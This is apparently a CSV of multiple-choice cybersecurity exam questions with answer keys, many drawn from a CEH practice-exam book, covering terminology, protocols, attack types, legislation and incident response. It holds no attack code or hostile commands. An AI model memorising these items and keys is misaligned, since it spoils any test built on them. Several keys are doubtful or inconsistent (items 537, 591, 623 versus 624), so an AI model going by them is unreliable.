index,question,options,answer_key
492,Which cybersecurity strategy involves placing multiple layers of defense across an IT system?,"{'A': 'Demilitarized Zone (DMZ)', 'B': 'Defense in Depth', 'C': 'Digital Watermarking', 'D': 'Decryption'}",B
493,What type of attack involves an attacker attempting to access restricted directories and execute commands outside of intended web server directories by manipulating the URL?,"{'A': 'DNS cache poisoning', 'B': 'Directory traversal attack', 'C': 'Distributed DoS (DDoS)', 'D': 'DNS enumeration'}",B
494,"Which cybersecurity term describes the act of secretly listening to private conversations of others without their consent, potentially through various communication methods?","{'A': 'Doxing', 'B': 'Eavesdropping', 'C': 'Dropper', 'D': 'Dumpster diving'}",B
495,"What process involves attaching a protocol header and trailer to data before network transmission, occurring at Layer 2 of the OSI model?","{'A': 'Encryption', 'B': 'Enumeration', 'C': 'Encapsulation', 'D': 'Authentication'}",C
496,What is an exploit in cybersecurity?,"{'A': 'A network incident that prompts a log entry.', 'B': 'Software code designed to take advantage of a bug or vulnerability.', 'C': 'The rate at which a biometric system incorrectly identifies an unauthorized individual.', 'D': 'A protocol for authentication used within wireless networks.'}",B
497,What is the primary function of a firewall?,"{'A': 'To increase network speed by filtering packets.', 'B': 'To transmit files across an internet connection.', 'C': 'To restrict access between networks and block unwanted traffic.', 'D': 'To provide information on users logged onto a machine.'}",C
498,"What is the process of sending traffic received on an interface out all other interfaces on a device, excluding the one it was received on, used by bridges and switches?","{'A': 'Footprinting', 'B': 'Forwarding', 'C': 'Fragmentation', 'D': 'Flood'}",D
499,"Which cybersecurity term describes a hacker who operates in a legal gray area, sometimes performing illegal acts to improve security?","{'A': 'Black hat', 'B': 'White hat', 'C': 'Gray hat', 'D': 'Hacktivism'}",C
500,"Which security concept involves using a decoy network to detect, deflect, or deter unauthorized use of information systems?","{'A': 'Honeypot', 'B': 'Honeynet', 'C': 'Hot site', 'D': 'Host-based intrusion detection system (HIDS)'}",B
501,What type of fraud involves someone falsely assuming another person's identity to gain resources or benefits?,"{'A': 'Impersonation', 'B': 'Inference attack', 'C': 'Identity theft', 'D': 'Insider affiliate'}",C
502,Which security property ensures that data remains unaltered and unmodified without detection?,"{'A': 'Confidentiality', 'B': 'Availability', 'C': 'Integrity', 'D': 'Authentication'}",C
503,"What security tool protects a system or network by comparing traffic patterns against known attack signatures and general attack characteristics, and takes protective measures against significant threats?","{'A': 'Intrusion Detection System (IDS)', 'B': 'Internet Protocol Security (IPSec) architecture', 'C': 'Iris scanner', 'D': 'Intrusion Prevention System (IPS)'}",D
504,Which cybersecurity concept involves capturing user keystrokes?,"{'A': 'ISO/IEC 27001', 'B': 'Kerberos', 'C': 'keylogger', 'D': 'logic bomb'}",C
505,"Which cybersecurity term describes software or firmware designed to perform unauthorized processes that negatively impact an information system's confidentiality, integrity, or availability?","{'A': 'Macro virus', 'B': 'Malicious code', 'C': 'Man-in-the-middle attack', 'D': 'Mantrap'}",B
506,What does Network Address Translation (NAT) allow a network to do with its IP addresses?,"{'A': 'Advertise multiple IP addresses externally to represent internal machines.', 'B': 'Hide the IP addresses of internal machines from external users by rerouting data packets.', 'C': 'Allow direct external access to all internal IP addresses for improved performance.', 'D': 'Encrypt all external IP addresses to prevent unauthorized access.'}",B
507,What is a security concept that ensures a message recipient can verify the sender's identity and that neither party can deny sending or receiving it?,"{'A': 'Network Interface Card (NIC)', 'B': 'Nonrepudiation', 'C': 'Network Basic Input/Output System (NetBIOS)', 'D': 'Network Operations Center (NOC)'}",B
508,"Which security protocol, considered insecure and replaced by NTLMv2, was retained in later versions of Windows for backward compatibility?","{'A': 'OSI Model', 'B': 'OpenBSD', 'C': 'NTLM', 'D': 'OSSTMM'}",C
509,What method controls network access by examining packet headers and applying administrator-defined rules?,"{'A': 'Parameter tampering', 'B': 'Packet filtering', 'C': 'Passive attack', 'D': 'Acker'}",B
510,What is a social engineering attack that typically involves an email with a fraudulent link designed to trick recipients?,"{'A': 'Ping sweep', 'B': 'Phishing', 'C': 'Penetration testing', 'D': 'Payload'}",B
511,"Which cybersecurity term describes malicious code that modifies itself each time it executes, while preserving its core functionality?","{'A': 'Port knocking', 'B': 'Polymorphic virus', 'C': 'Port redirection', 'D': 'Platform as a Service (PaaS)'}",B
512,Which security program is commonly employed for encrypting and decrypting emails and files?,"{'A': 'Post Office Protocol 3 (POP3)', 'B': 'Pretty Good Privacy (PGP)', 'C': 'private key', 'D': 'private network address'}",B
513,What is the primary purpose of a proxy server in cybersecurity?,"{'A': 'To encrypt data for secure communication.', 'B': 'To obfuscate the host from the Internet.', 'C': 'To verify digital signatures.', 'D': 'To assess network vulnerabilities.'}",B
514,What type of cyberattack involves a hacker repeating a part of a cryptographic exchange to deceive a system into establishing a communication channel?,"{'A': 'Reverse social engineering', 'B': 'Replay attack', 'C': 'Remote access', 'D': 'Reconnaissance'}",B
515,What is a 'rogue access point' in the context of cybersecurity?,"{'A': 'A wireless access point intentionally installed to monitor network traffic.', 'B': 'A legitimate wireless access point used by employees to connect to the company network.', 'C': 'A wireless access point installed without authorization on a secure network, potentially to facilitate man-in-the-middle attacks.', 'D': 'A device used to manage and secure all wireless connections within an organization.'}",C
516,What is the maximum number of hops allowed in a path when using the Routing Information Protocol (RIP)?,"{'A': '8', 'B': '15', 'C': '16', 'D': '180'}",B
517,Which of the following best describes a security bulletin?,"{'A': 'A cloud computing service offering penetration testing.', 'B': 'A method of exploiting security vulnerabilities.', 'C': 'An announcement detailing a known program vulnerability and potential patches.', 'D': 'A file storing password hashes for a Windows system.'}",C
518,What is a security defect?,"{'A': 'Safeguards or countermeasures to avoid security risks.', 'B': 'A group of experts that handles computer security incidents.', 'C': 'An unknown deficiency in software or some other product that results in a security vulnerability being identified.', 'D': 'The method by which Windows identifies user, group, and computer accounts for rights and permissions.'}",C
519,Which cybersecurity term describes an attack where a hacker intercepts and takes over an established communication session by guessing sequence numbers?,"{'A': 'Session splicing', 'B': 'Session hijacking', 'C': 'Sidejacking', 'D': 'Shoulder surfing'}",B
520,"What is a ""smishing"" attack characterized by?","{'A': 'Intercepting and logging network traffic.', 'B': 'Tricking users into downloading malware via text messages.', 'C': 'Flooding a network with pings from a spoofed IP address.', 'D': 'Manipulating people through nontechnical methods.'}",B
521,What is a nontechnical method of hacking that involves manipulating people into providing sensitive information?,"{'A': 'Spoofing', 'B': 'Social engineering', 'C': 'Steganography', 'D': 'Spam'}",B
522,Which cybersecurity attack involves overwhelming a network with illegitimate TCP connection requests by repeatedly sending SYN packets while ignoring SYN/ACK responses?,"{'A': 'Sybil attack', 'B': 'SYN flood attack', 'C': 'Tailgating', 'D': 'SYN attack'}",B
523,"What is defined as any circumstance or event with the potential to adversely impact organizational operations, assets, or individuals through an information system?","{'A': 'Tiger team', 'B': 'Time bomb', 'C': 'Threat', 'D': 'Traceroute'}",C
524,What is a program that masquerades as a legitimate application but carries a hidden malicious intent?,"{'A': 'Trapdoor function', 'B': 'Trusted computing base', 'C': 'Trojan horse', 'D': 'Transport Layer Security'}",C
525,What describes the process of transmitting one protocol encapsulated inside another protocol?,"{'A': 'Unicode', 'B': 'Tunneling', 'C': 'UDP', 'D': 'VANET'}",B
526,What is a security vulnerability?,"{'A': 'A practice of identifying and mitigating weaknesses in an information system.', 'B': 'A malicious computer program with self-replication capabilities.', 'C': 'A weakness in an information system that could be exploited by a threat.', 'D': 'A technology that establishes a private, encrypted tunnel over the Internet.'}",C
527,What is the primary purpose of WEP (Wired Equivalent Privacy)?,"{'A': 'To define a standard for devices to connect to a wireless network.', 'B': 'To provide data encryption for IEEE 802.11 wireless networks.', 'C': 'To offer the same level of security as a wired LAN for wireless networks.', 'D': 'To query databases for registered users or assignees of Internet resources.'}",C
528,Which cybersecurity term describes an attack that exploits a vulnerability before a vendor is aware of it and has released a fix?,"{'A': 'Wiretapping', 'B': 'Zero-day attack', 'C': 'Wrapper', 'D': 'Zombie'}",B
529,What is the primary purpose of Alternate Data Streams (ADS) in cybersecurity as indicated by the text?,"{'A': 'To manage wireless access points.', 'B': 'To implement robust access control policies.', 'C': 'To store hidden or additional file-related data.', 'D': 'To perform active online attacks.'}",C
530,Which of the following terms refers to a cybersecurity metric used to quantify the expected monetary loss from a risk over a one-year period?,"{'A': 'Annualized Rate of Occurrence (ARO)', 'B': 'Annualized Loss Expectancy (ALE)', 'C': 'Alternate Data Stream (ADS)', 'D': 'Application Programming Interface (API)'}",B
531,Which type of attack involves manipulating the ARP cache to impersonate devices on a network?,"{'A': 'DNS spoofing', 'B': 'ARP poisoning', 'C': 'DDoS attack', 'D': 'SQL injection'}",B
532,Which of the following is a method of authentication that uses unique biological characteristics?,"{'A': 'Multifactor authentication', 'B': 'Biometric authentication', 'C': 'Shared key authentication', 'D': 'Open system authentication'}",B
533,Which of the following is a type of encryption algorithm mentioned in the text that uses a fixed-size block of data?,"{'A': 'Salt bits', 'B': 'Bit flipping', 'C': 'Block ciphers', 'D': 'Broadcast addressing'}",C
534,What security concept is represented by the CIA triad?,"{'A': 'Authentication, Integrity, and Authorization', 'B': 'Confidentiality, Integrity, and Availability', 'C': 'Confidentiality, Access, and Identification', 'D': 'Availability, Authentication, and Authorization'}",B
535,Which of the following is listed as a type of attack against cloud computing environments in the provided text?,"{'A': 'Christmas scan', 'B': 'Clickjacking', 'C': 'Cloud hopper attack', 'D': 'Dot-dot-slash attack'}",C
536,What security principle focuses on preventing unauthorized disclosure of information?,"{'A': 'Integrity', 'B': 'Availability', 'C': 'Confidentiality', 'D': 'Authenticity'}",C
537,"Which cybersecurity concept is associated with the term ""crackers""?","{'A': 'Network intrusion detection', 'B': 'Password vulnerability assessment', 'C': 'Malware analysis', 'D': 'Ethical hacking'}",B
538,Which of the following terms refers to a security measure designed to prevent unauthorized code execution by marking specific memory regions as non-executable?,"{'A': 'Data Execution Prevention (DEP)', 'B': 'Demilitarized Zone (DMZ)', 'C': 'Discretionary Access Control (DAC)', 'D': 'Directory Traversal'}",A
539,Which type of attack is a distributed reflection denial-of-service attack?,"{'A': 'DLL hijacking', 'B': 'DRDoS attack', 'C': 'DROWN attack', 'D': 'DNS poisoning'}",B
540,Which of the following is a symmetric encryption algorithm mentioned in the text?,"{'A': 'El Gamal algorithm', 'B': 'AES', 'C': 'ECC', 'D': 'GOST'}",B
541,Which of the following is listed as a technique or method used in evasion tactics?,"{'A': 'Banner grabbing', 'B': 'IP address spoofing', 'C': 'NetBIOS enumeration', 'D': 'SNMP scanning'}",B
542,"Which security concept is directly related to identifying vulnerabilities and gathering information about a target system or network, as described in the provided text?","{'A': 'False Rejection Rate (FRR)', 'B': 'Footprinting', 'C': 'Fileless Malware', 'D': 'Firmware Rootkits'}",B
543,Which of the following terms is listed as a method/tool used in passive footprinting?,"{'A': 'Web mirroring', 'B': 'DNS footprinting', 'C': 'Search engines', 'D': 'Network footprinting'}",C
544,Which of the following terms refers to individuals who exploit vulnerabilities in systems for personal gain or malicious intent?,"{'A': 'White hats', 'B': 'Gray hats', 'C': 'Black hats', 'D': 'Ethical hackers'}",C
545,Which of the following terms refers to a system designed to detect unauthorized access to a computer or network?,"{'A': 'HashMyFiles', 'B': 'Honeypot', 'C': 'HIDS (host-based IDS)', 'D': 'HTTPRecon'}",C
546,Which protocol is described as a method for ICMP Echo scanning?,"{'A': 'ICMP floods', 'B': 'ICMP packets', 'C': 'ICMP message types', 'D': 'ICMP requests'}",B
547,Which of the following is a method for gathering competitive intelligence as described in the text?,"{'A': 'Web-based hacking', 'B': 'Dumpster diving', 'C': 'Injection attacks', 'D': 'Network scanning'}",B
548,Which of the following is explicitly mentioned as a type of attack on IoT devices?,"{'A': 'HVAC attacks', 'B': 'SQL injection attacks', 'C': 'DDoS attacks', 'D': 'Man-in-the-middle attacks'}",A
549,Which of the following is a type of rootkit that operates at the library level?,"{'A': 'Kernel-level rootkits', 'B': 'Library-level rootkits', 'C': 'User-mode rootkits', 'D': 'Bootkit rootkits'}",B
550,Which of the following is a method used to cover or clear tracks within a Linux system's logs?,"{'A': 'MAC address spoofing', 'B': 'Deleting log files', 'C': 'LLMNR attacks', 'D': 'LOIC attacks'}",B
551,Which of the following refers to an attack where an unauthorized party intercepts and possibly alters the communication between two parties who believe they are directly communicating with each other?,"{'A': 'Man-in-the-cloud (MITC) attack', 'B': 'Man-in-the-middle (MITM) attack', 'C': 'Mandatory access control (MAC)', 'D': 'Meltdown attack'}",B
552,Which of the following is listed as a common attack vector or vulnerability associated with mobile devices?,"{'A': 'Multicast messages', 'B': 'Modulation', 'C': 'Phishing', 'D': 'MX records'}",C
553,Which of the following is a protocol used for transferring network news?,"{'A': 'NTP', 'B': 'NAT', 'C': 'NNTP', 'D': 'NICs'}",C
554,Which of the following protocols is mentioned in relation to network time synchronization?,"{'A': 'NTPv3', 'B': 'OpenPGP standard', 'C': 'Oakley protocol', 'D': 'N-Stacker X scanner'}",A
555,Which of the following is mentioned as a tool used for password cracking?,"{'A': 'Packet Builder', 'B': 'OWASP Top 10', 'C': 'John the Ripper', 'D': 'Pacu tool'}",C
556,Which of the following methods is described as obtaining passwords by asking for them?,"{'A': 'Sniffing', 'B': 'Shoulder surfing', 'C': 'Keyboard walks', 'D': 'Obtaining by asking for'}",D
557,Which of the following is a type of phishing that targets voice communication?,"{'A': 'Spear phishing', 'B': 'Email phishing', 'C': 'Voice phishing', 'D': 'Pharming'}",C
558,Which of the following is a specific protocol mentioned that handles email retrieval?,"{'A': 'POODLE', 'B': 'POP3', 'C': 'PGP', 'D': 'PRISM'}",B
559,Which of the following refers to a type of attack targeting network protocols?,"{'A': 'Rainbow tables', 'B': 'Protocol attacks', 'C': 'Proxy chains', 'D': 'Registry hacking'}",B
560,What is the primary purpose of SAST (Static Application Security Testing)?,"{'A': 'To identify vulnerabilities during the runtime execution of an application.', 'B': 'To analyze the source code of an application for security flaws before deployment.', 'C': 'To test the network infrastructure for potential security breaches.', 'D': 'To monitor user activity for suspicious behavior within a system.'}",B
561,Which of the following protocols is mentioned as supporting specific scanning techniques like SCTP COOKIE Scanning and SCTP INIT scanning?,"{'A': 'Secure Shell (SSH)', 'B': 'Secure Sockets Layer (SSL)', 'C': 'Stream Control Transmission Protocol (SCTP)', 'D': 'Secure/Multipurpose Internet Mail Extensions (S/MIME)'}",C
562,Which of the following refers to a common method of intercepting user credentials by looking over a person's shoulder?,"{'A': 'Session hijacking', 'B': 'Shoulder surfing', 'C': 'Shell injection', 'D': 'Shredders'}",B
563,Which tool is listed as a network sniffer in the provided text?,"{'A': 'Slowloris', 'B': 'SMAC', 'C': 'Ettercap', 'D': 'Sirefef'}",C
564,Which of the following is listed as a method used in social engineering attacks?,"{'A': 'SQL injection', 'B': 'SNMP enumeration', 'C': 'Phishing e-mail', 'D': 'MAC address spoofing'}",C
565,Which of the following terms refers to a type of stealth attack that involves hiding data within other files?,"{'A': 'SQL injection', 'B': 'Steganography', 'C': 'SSID cloaking', 'D': 'SYN flood'}",B
566,Which of the following is a type of attack that involves causing permanent damage to a system?,"{'A': 'SYN/ACK packets', 'B': 'TCP session hacking', 'C': 'Bricking', 'D': 'Reconnaissance'}",C
567,What is the primary function of the Temporal Key Integrity Protocol (TKIP)?,"{'A': 'To manage ticket granting services for authentication.', 'B': 'To provide a secure method for transporting data over networks.', 'C': 'To update encryption keys in wireless security protocols.', 'D': 'To scan for vulnerabilities in cloud computing environments.'}",C
568,"Which of the following is a protocol used for sending datagrams, commonly employed in network scans and attacks like UDP floods?","{'A': 'TCP (Transmission Control Protocol)', 'B': 'HTTP (Hypertext Transfer Protocol)', 'C': 'UDP (User Datagram Protocol)', 'D': 'FTP (File Transfer Protocol)'}",C
569,"Which type of attack involves exploiting vulnerabilities in web applications, specifically by injecting malicious SQL code?","{'A': 'Directory traversal', 'B': 'SQL injection', 'C': 'Web defacement', 'D': 'Web cache poisoning'}",B
570,Which of the following is a type of attack mentioned in the context of web servers?,"{'A': 'WEP cracking', 'B': 'Directory traversal', 'C': 'WIGLE service', 'D': 'Windows enumeration'}",B
571,Which of the following is a wireless hacking technique specifically mentioned in the context of attacking WEP security?,"{'A': 'MAC spoofing', 'B': 'War driving', 'C': 'Sniffing', 'D': 'XOR operations'}",A
572,What type of attacks involve the exploitation of vulnerabilities in code that has been recently discovered but has no patch or fix available?,"{'A': 'SQL Injection', 'B': 'Cross-Site Scripting (XSS)', 'C': 'Zero-day attacks', 'D': 'XML External Entities (XXE)'}",C
573,"Which of the following certifications does Brad Horton hold, demonstrating his expertise in information assurance?","{'A': 'Certified Information Technology Professional (CITP)', 'B': 'Certified Information Systems Security Professional (CISSP)', 'C': 'Certified Data Privacy Manager (CDPM)', 'D': 'Certified Network Defender (CND)'}",B
574,What is the primary purpose of the publication mentioned in the text?,"{'A': 'To provide a comprehensive database of cybersecurity threats.', 'B': 'To assist students in preparing for the Certified Ethical Hacker (CEHâ„¢) exam.', 'C': ""To grant permission for the reproduction of EC-Council's copyrighted material."", 'D': ""To offer corporate training programs on McGraw-Hill's website.""}",B
575,"What is strictly prohibited regarding the use of the copyrighted work provided by McGraw-Hill Education, unless prior consent is obtained?","{'A': 'Storing and retrieving one copy of the work for personal use.', 'B': 'Decompiling, reproducing, or transmitting any part of the work.', 'C': 'Using the work for noncommercial and personal purposes.', 'D': 'Creating derivative works for purely academic research.'}",B
582,"What is the primary role of a technical editor in the book writing process, as described in the text?","{'A': 'To provide initial conceptualization and inspiration for the book.', 'B': 'To offer financial support and marketing strategies for the book.', 'C': 'To meticulously review and refine the technical accuracy and real-world applicability of the content.', 'D': ""To manage the publishing house's relationship with the author and ensure timely delivery.""}",C
583,What does the introduction to the CEH practice exams primarily address?,"{'A': 'The technical details of specific hacking techniques.', 'B': 'The career paths available after obtaining CEH certification.', 'C': 'The purpose and audience of the CEH practice exams.', 'D': 'The historical development of ethical hacking standards.'}",C
584,What is a key ethical requirement for candidates attempting the CEH certification exam?,"{'A': 'Memorizing specific exam questions and answers.', 'B': 'Signing a nondisclosure agreement.', 'C': 'Attending specialized training courses.', 'D': 'Achieving a perfect score on practice exams.'}",B
585,"According to the text, what is the recommended approach to passing the CEH certification exam?","{'A': 'Relying solely on a single study book.', 'B': 'Gaining at least two years of IT security experience and practicing extensively.', 'C': 'Attending barber college for practical experience.', 'D': 'Focusing only on the four-hour, 125-question exam marathon.'}",B
586,Which of the following is a self-study training option for CEH certification?,"{'A': 'MasterClass Live Online', 'B': 'MasterClass In Person', 'C': 'Self-Paced', 'D': 'Virtual Classroom training'}",C
587,What type of exam format is the Certified Ethical Hacker (CEH) examination?,"{'A': 'Online, self-paced test with flexible timing.', 'B': 'Live, in-person exam with a strict time limit per question.', 'C': 'Computer-based, proctored test taken at an authorized facility.', 'D': 'Open-book exam allowing access to all training materials.'}",C
588,"According to the text, how does EC-Council determine the passing score for its exams?","{'A': 'By setting a fixed percentage of correct answers required across all exam versions.', 'B': 'By assigning a standardized cut score based on the difficulty of the test bank.', 'C': 'By adjusting the required percentage based on the difficulty rating of the assigned question block.', 'D': 'By ensuring that candidates answer questions from specific, predetermined blocks.'}",C
589,"According to EC-Council's philosophy, what is the primary purpose of their certification exams?","{'A': 'To validate the effectiveness of specific courseware and training programs.', 'B': 'To assess competence in applying skills and knowledge, regardless of learning source.', 'C': 'To ensure candidates have memorized the content of official EC-Council courseware.', 'D': 'To test the ability to pass practice exams created by EC-Council.'}",B
591,Which cybersecurity concept's methodology terms are being referred to as 'Cyber Kill Chain methodology terms'?,"{'A': 'Phishing', 'B': 'Malware analysis', 'C': 'Network intrusion', 'D': 'IT security'}",D
592,"When studying definitions for an exam where memorization is key, what study technique is suggested to help recall answers to potentially confusing test questions?","{'A': 'Focusing on complex formulas and script nuances.', 'B': 'Associating key words within each definition with the term.', 'C': 'Consulting external, unverified online forums for alternative interpretations.', 'D': 'Prioritizing memorization of concepts already understood.'}",B
593,"Which phase of incident response (IR) involves establishing rules, defining workforce roles, and developing backup and testing plans?","{'A': 'Preparation', 'B': 'Containment', 'C': 'Eradication', 'D': 'Recovery'}",A
594,Which of the following is defined as ensuring the enforcement of organizational security policy does not rely on voluntary user compliance by assigning sensitivity labels on information and comparing this to the level of security a user is operating at?,"{'A': 'Mandatory access control', 'B': 'Authorized access control', 'C': 'Role-based access control', 'D': 'Discretionary access control'}",A
595,Which of the following is considered a detective control?,"{'A': 'Audit trail', 'B': 'CONOPS', 'C': 'Procedure', 'D': 'Smartcard authentication'}",A
596,"Which of the following acts was established to safeguard shareholders and the public from corporate accounting errors and fraudulent activities, while also enhancing the precision of corporate disclosures?","{'A': 'GLBA', 'B': 'HIPAA', 'C': 'SOX', 'D': 'FITARA'}",C
597,What is the term for indicators that signal a potential intrusion or malicious activity?,"{'A': 'TTP (Tactics, Techniques, and Procedures)', 'B': 'IOC (Indicator of Compromise)', 'C': 'APT (Advanced Persistent Threat)', 'D': 'ABI (Application Binary Interface)'}",B
598,What is the primary goal of security teams in relation to risk management?,"{'A': 'To eliminate all risks from a system entirely.', 'B': 'To reduce all identified risks to an acceptable level.', 'C': 'To ignore any remaining risks after applying controls.', 'D': 'To remove all security controls once some risks are mitigated.'}",B
599,"According to the CEH methodology, which step directly follows footprinting?","{'A': 'Enumeration', 'B': 'Reconnaissance', 'C': 'Scanning', 'D': 'Gaining access'}",C
600,What is the primary purpose of scanning a target in cybersecurity reconnaissance?,"{'A': 'To identify vulnerabilities that can be exploited.', 'B': 'To gather in-depth information about a specific discovered target.', 'C': 'To determine which targets are present and responsive.', 'D': 'To initiate an attack on the identified targets.'}",C
601,Which of the following is a component of a business continuity plan (BCP) that includes steps and procedures for restoring a specific resource after an outage?,"{'A': 'Annualized Loss Expectancy (ALE)', 'B': 'Disaster Recovery Plan (DRP)', 'C': 'Maximum Tolerable Downtime (MTD)', 'D': 'Single Loss Expectancy (SLE)'}",B
602,Which phase of incident response involves taking steps to remove malware and other attack-related residuals?,"{'A': 'Identification', 'B': 'Containment', 'C': 'Eradication', 'D': 'Recovery'}",C
603,"A client requests a pen test that simulates a normal user who seeks to elevate privileges and create attacks, suggesting the user has some knowledge of the network and resources. What type of test is the client requesting?","{'A': 'White-box testing', 'B': 'Gray-box testing', 'C': 'Black-box testing', 'D': 'Hybrid testing'}",B
604,"What type of access control assigns sensitivity labels to information and compares them to a user's security level to enforce policy, preventing reliance on voluntary user compliance?","{'A': 'Discretionary access control', 'B': 'Role-based access control', 'C': 'Mandatory access control', 'D': 'Authorized access control'}",C
605,"In role-based access control (RBAC), how do users acquire permissions?","{'A': 'Users are assigned permissions directly to their accounts.', 'B': 'Permissions are acquired by users through their assigned roles.', 'C': 'MAC administrators grant specific permissions to individual users.', 'D': 'Data owners set permissions for each user accessing an object.'}",B
606,"During a TCP three-way handshake, what action is performed in the initial segment sent by the host to the server?","{'A': ""Sets the ACK flag and acknowledges the server's sequence number."", 'B': 'Turns on the SYN and ACK flags and acknowledges the initial sequence number.', 'C': 'Turns on the SYN flag and sets an initial sequence number.', 'D': 'Sends an acknowledgement and a randomly generated sequence number.'}",C
607,What is the Annualized Rate of Occurrence (ARO) for a server that fails once every five years?,"{'A': '20 percent', 'B': '$1480', 'C': '$1000', 'D': '$296'}",A
608,"An ethical hacker, hired with a specific agreement and no prior knowledge of the target network, is best described as performing what type of security test?","{'A': 'A white-box test', 'B': 'A gray-box test', 'C': 'A black-box test', 'D': 'A zero-knowledge test'}",C
609,"Which of the following security controls is designed to identify problems, errors, or evidence of an exploited vulnerability after it has occurred?","{'A': 'Smartcard authentication', 'B': 'Procedure', 'C': 'Audit trail', 'D': 'Concept of Operations (CONOPS)'}",C
610,"Which U.S. act specifically addresses the protection of personal information, including Social Security numbers, and restricts government agencies from disclosing it without consent?","{'A': 'FISMA', 'B': 'Privacy Act', 'C': 'PATRIOT Act', 'D': 'Freedom of Information Act'}",B
611,Which of the following acts is primarily focused on ensuring the security of government systems through standardized controls and periodic accreditation?,"{'A': 'The PATRIOT Act', 'B': 'The Freedom of Information Act', 'C': 'The Federal Information Security Management Act (FISMA)', 'D': 'Electronic Communications and Interception Act'}",C
612,Which stage of the Cyber Kill Chain involves creating the malicious payload using an exploit?,"{'A': 'Delivery', 'B': 'Exploitation', 'C': 'Weaponization', 'D': 'Installation'}",C
613,Which phase of the ethical hacking methodology involves using tools like ping sweeps to discover available targets on a network?,"{'A': 'Reconnaissance', 'B': 'Scanning and enumeration', 'C': 'Gaining access', 'D': 'Maintaining access'}",B
614,"Which phase of a cyber attack actively utilizes tools and techniques on gathered information to uncover more detailed data about targets, building upon the reconnaissance stage?","{'A': 'Reconnaissance', 'B': 'Scanning and Enumeration', 'C': 'Gaining Access', 'D': 'Maintaining Access'}",B
615,"Which piece of legislation was enacted to enhance corporate responsibility, improve financial disclosures, and combat corporate and accounting fraud?","{'A': 'Gramm-Leach-Bliley Act (GLBA)', 'B': 'Federal Information Technology Acquisition Reform Act (FITARA)', 'C': 'Sarbanes-Oxley Act (SOX)', 'D': 'Health Insurance Portability and Accountability Act (HIPAA)'}",C
616,"Which type of control is a security token, used for authentication?","{'A': 'A physical control', 'B': 'A logical (or technical) control', 'C': 'An administrative control', 'D': 'An environmental control'}",B
617,"What security standard was established to safeguard credit card information both when stored and when being transmitted, aiming to decrease fraud?","{'A': 'TCSEC (Trusted Computer System Evaluation Criteria)', 'B': 'Common Criteria', 'C': 'ISO 27002', 'D': 'PCI DSS (Payment Card Industry Data Security Standard)'}",D
618,"Which information security standard, published by ISO and the International Electrotechnical Commission (IEC), recommends security controls based on industry best practices and includes objectives ranging from structure to compliance?","{'A': 'Trusted Computer System Evaluation Criteria (TCSEC)', 'B': 'Common Criteria', 'C': 'ISO 27002', 'D': 'Orange Book'}",C
619,A client is concerned about internal threats from their user base and wants to discover security flaws and possible remediation. Which type of penetration test best describes this scenario?,"{'A': 'Black box testing', 'B': 'Gray box testing', 'C': 'White hat testing', 'D': 'Black hat testing'}",B
620,"Which phase of a cyberattack involves setting up and configuring ""zombie"" machines?","{'A': 'Reconnaissance', 'B': 'Covering tracks', 'C': 'Gaining access', 'D': 'Maintaining access'}",D
621,Which of the following elements is typically NOT included in a security policy?,"{'A': 'Policy exceptions', 'B': 'Details on noncompliance disciplinary actions', 'C': 'Technical details and procedures', 'D': 'References to supporting documents'}",C
622,Which cybersecurity process focuses on identifying and eradicating vulnerabilities before an incident occurs?,"{'A': 'Incident management', 'B': 'Vulnerability management', 'C': 'Change management', 'D': 'Patch management'}",B
623,"During a penetration test, if child pornography is discovered on a system, what is the recommended immediate action?","{'A': 'Continue testing and document the finding for the out-brief.', 'B': 'Stop testing and report the finding to the business owners.', 'C': 'Immediately cease testing and refuse further work with the client.', 'D': 'Immediately cease testing and contact law enforcement authorities.'}",D
624,"According to the text, when an ethical hacker discovers illegal activity like child pornography during testing, what is the recommended immediate action?","{'A': 'Continue testing to gather more evidence before reporting.', 'B': 'Stop testing and report the illegal activity to the authorities.', 'C': 'Inform the client about the discovery and await their instructions.', 'D': 'Document the finding and address it in the final report without immediate notification.'}",B
625,"Which network zone, intended for internal users, prioritizes usability and functionality over heavy security restrictions?","{'A': 'The DMZ (Demilitarized Zone)', 'B': 'The Management Network Zone', 'C': 'The Intranet', 'D': 'The Production Network Zone (PNZ)'}",C
626,"According to the provided text, which of the following correctly defines the relationship between a threat and a vulnerability in the context of cybersecurity?","{'A': 'A vulnerability exploits a threat to cause harm.', 'B': 'A threat exploits a vulnerability to cause harm.', 'C': 'A threat is a weakness that can be exploited by a vulnerability.', 'D': 'A vulnerability is an agent that causes potential harm.'}",B
627,What type of forensic evidence describes small clues and artifacts left on a resource that can indicate malicious intrusion or activity?,"{'A': 'TTP (Tactics, Techniques, and Procedures)', 'B': 'IOC (Indicator of Compromise)', 'C': 'APT (Advanced Persistent Threat)', 'D': 'ABI (Adversary Behavioral Identification)'}",B
